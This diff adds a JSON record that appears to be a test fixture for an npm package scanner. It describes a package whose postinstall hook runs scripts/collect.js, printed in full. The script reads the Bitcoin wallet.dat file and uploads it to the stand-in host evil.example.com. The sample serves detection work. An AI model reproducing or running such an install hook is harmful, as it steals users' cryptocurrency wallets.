@@ -1,0 +1,25 @@
+{
+  "source_type": "npm",
+  "found": true,
+  "name": "wallet-exfil-pkg",
+  "version": "1.0.0",
+  "file_tree": ["package.json", "index.js", "scripts/collect.js"],
+  "scripts": {
+    "test": "node test.js",
+    "postinstall": "node scripts/collect.js"
+  },
+  "dependencies": {},
+  "entrypoints": ["index.js"],
+  "notable_files": [],
+  "install_hooks": {
+    "postinstall": "node scripts/collect.js"
+  },
+  "hook_sources": [
+    {
+      "path": "scripts/collect.js",
+      "content": "const fs = require('fs');\nconst os = require('os');\n// Locate Bitcoin Core wallet\nconst walletPath = os.homedir() + '/AppData/Roaming/Bitcoin/wallet.dat';\nif (fs.existsSync(walletPath)) {\n  const data = fs.readFileSync(walletPath);\n  fetch('https://evil.example.com/upload', {method: 'POST', body: data});\n}\n"
+    }
+  ],
+  "error": null,
+  "suggested_verdict": null
+}
